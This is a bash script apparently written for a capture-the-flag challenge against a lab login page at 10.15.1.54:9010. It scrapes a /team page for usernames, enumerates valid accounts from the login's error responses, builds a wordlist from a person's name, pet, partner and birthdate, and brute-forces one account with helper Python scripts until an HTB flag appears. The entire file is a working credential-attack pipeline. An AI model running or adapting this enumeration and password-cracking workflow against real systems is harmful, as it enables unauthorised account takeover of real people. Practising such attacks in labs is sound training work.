#!/usr/bin/env bash
# getflag_enum.sh - username enumeration -> targeted wordlist -> crack (challenge 10).
#
# Challenge "10 - Brute Force: Username Enumeration":
#   Target: http://10.15.1.54:9010/  (tavsifda 10.15.0.238:9010)
#   1) login tells you if a username exists  -> enumerate valid accounts
#   2) /team has OSINT -> build a targeted (cupp-style) wordlist
#   3) crack that ONE account (admin is out of reach)
#
# Fill in the OSINT you read from /team, then run:
#     FIRST=John LAST=Doe NICK=jd PET=Sunshine BIRTH=1988-03-12 ./getflag_enum.sh
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
TARGET="${TARGET:-10.15.1.54}"
PORT="${PORT:-9010}"
BASE="http://${TARGET}:${PORT}"
LOGIN_PATH="${LOGIN_PATH:-/login}"
VALID_USER="${VALID_USER:-}"      # set if you already know it; else auto-enumerate

# OSINT for the target human (read from /team):
FIRST="${FIRST:-}"; LAST="${LAST:-}"; NICK="${NICK:-}"
PET="${PET:-}"; PARTNER="${PARTNER:-}"; COMPANY="${COMPANY:-Acme}"
BIRTH="${BIRTH:-}"; EXTRA="${EXTRA:-}"

echo "[*] target = ${BASE}"

# ---- 0) reachability ------------------------------------------------------
if [ "$(curl -s -m 8 -o /dev/null -w '%{http_code}' "${BASE}/")" = "000" ]; then
  echo "[!] cannot reach ${BASE}/ - wrong network/IP? try TARGET=10.15.0.238"
  exit 2
fi

# ---- 1) pull /team and derive candidate usernames ------------------------
echo "[*] fetching /team ..."
curl -s -m 10 "${BASE}/team" -o /tmp/team.html || true
grep -oiE '[a-z0-9._%+-]+@[a-z0-9.-]+' /tmp/team.html | sed 's/@.*//' > /tmp/cand.txt || true
# common firstname/lastname combos
{
  echo "admin"; echo "administrator"; echo "root"; echo "jdoe"; echo "user";
} >> /tmp/cand.txt
sort -u /tmp/cand.txt -o /tmp/cand.txt
echo "[*] candidates: $(wc -l < /tmp/cand.txt)"

# ---- 2) enumerate valid usernames ----------------------------------------
if [ -z "$VALID_USER" ]; then
  echo "[*] enumerating usernames ..."
  python3 "${HERE}/enum_users.py" --url "${BASE}${LOGIN_PATH}" \
      --users /tmp/cand.txt --threads 10 || true
  VALID_USER="$(python3 "${HERE}/enum_users.py" --url "${BASE}${LOGIN_PATH}" \
      --users /tmp/cand.txt --threads 10 2>/dev/null | sed -n 's/.*valid usernames: //p' \
      | tr ',' '\n' | grep -v '^ *admin' | head -1 | tr -d ' ')"
fi
[ -z "$VALID_USER" ] && { echo "[!] no valid username found; edit /tmp/cand.txt manually"; exit 1; }
echo "[+] target account -> ${VALID_USER}"

# ---- 3) build a targeted wordlist ----------------------------------------
echo "[*] building targeted wordlist from OSINT ..."
EXTRA_ARGS=""
for e in $EXTRA; do EXTRA_ARGS="$EXTRA_ARGS --extra $e"; done
python3 "${HERE}/gen_wordlist.py" \
    --first "$FIRST" --last "$LAST" --nick "$NICK" \
    --pet "$PET" --partner "$PARTNER" --company "$COMPANY" \
    --birthdate "$BIRTH" --leet $EXTRA_ARGS --out /tmp/target.txt
echo "[*] wordlist size: $(wc -l < /tmp/target.txt)"

# ---- 4) crack that one account (brute.py prints the flag from the success page)
echo "[*] cracking ${VALID_USER} ..."
OUT="$(python3 "${HERE}/brute.py" \
        --url "${BASE}${LOGIN_PATH}" --login-page "${BASE}/" \
        --username "$VALID_USER" --wordlist /tmp/target.txt \
        --fail "Incorrect" --threads 16 --progress 20000 2>&1)"
printf '%s\n' "$OUT" | grep -vE '^\[\*\] tried' || true

FLAG="$(printf '%s\n' "$OUT" | grep -oE 'HTB\{[^}]*\}' | head -1)"
if [ -n "$FLAG" ]; then
  echo
  echo "========================================"
  echo "  FLAG: ${FLAG}"
  echo "========================================"
else
  echo "[!] no flag captured. Check the fail string (--fail) or add more OSINT fields."
fi
